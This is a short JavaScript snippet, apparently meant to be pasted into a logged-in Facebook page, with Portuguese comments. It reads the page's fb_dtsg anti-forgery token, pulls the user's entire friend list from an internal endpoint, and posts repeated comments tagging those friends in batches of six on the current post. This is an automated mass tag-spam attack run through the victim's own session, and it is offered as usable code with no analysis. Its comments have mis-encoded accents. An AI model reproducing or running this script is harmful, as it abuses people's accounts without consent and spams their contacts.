facebook
========

/* CRÃ‰DITOS AO MIGUEL TARGA, ESSA PARTE Ã‰ DELE */ function x__0() { return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest; };  //Pegar todos amigos function get_friends(){   var a=x__0();   a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&amp;filter[0]=user&amp;lazy=0&amp;viewer="+uid+"&amp;token=v7&amp;stale_ok=0&amp;options[0]=friends_only&amp;options[1]=nm", false);   a.send(null);   if (a.readyState == 4) {     var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));     return f.payload.entries;   }   return false; }  /* FIM DA PARTE DO MIGUEL TARGA */   //Pegar todos amigos function get_uid(b){   var a=x__0();   a.open("GET", 'http://graph.facebook.com/'+b, false);   a.send();   if (a.readyState == 4) {     return uid = JSON.parse(a.responseText).id;    }   return false; }   // Pattern que vai trocar o valor dos comentÃ¡rios pelas marcaÃ§Ãµes  var patt = /comment_text=(.*?)&amp;/ var c = 1; username = /\.com\/(.*?)\//.exec(window.top.location)[1]; uid = get_uid(username); a = window.top.location; termina = 0; var amigos = get_friends(); post_id = /[0-9]{8,}/.exec(a);         uids =  'comment_text='; header = 'ft_ent_identifier='+post_id+'&amp;comment_text=@[100000365625674:0]&amp;source=1&amp;client_id=1359576694192%3A1233576093&amp;reply_fbid&amp;parent_comment_id&amp;rootid=u_jsonp_3_19&amp;ft[tn]=[]&amp;ft[qid]=5839337351464612379&amp;ft[mf_story_key]=5470779710560437153&amp;ft[has_expanded_ufi]=1&amp;nctr[_mod]=pagelet_home_stream&amp;__user='+uid+'&amp;__a=1&amp;__req=4u&amp;fb_dtsg='+document.getElementsByName('fb_dtsg')[0].value+'&amp;phstamp='+Math.random();   for ( var n = 1 ; n &lt; amigos.length ; n++ ){       //uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';     fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;             uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';             c++;              if(c == 7){                             // Quando o contador chega em 7, ele termina o parÃ¢metro com um &amp;...                 uids += '&amp;';                 // ...envia as coisas com o mÃ©todo do indiano...                 with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(header.replace(patt, uids));                  // ... espera um segundo...                 z = setTimeout('function(){asd=0}', 1000);                 clearInterval(z);                  // ... e seta tudo de novo pra recomeÃ§ar                 c = 1;                 uids = 'comment_text=';                          }                  }
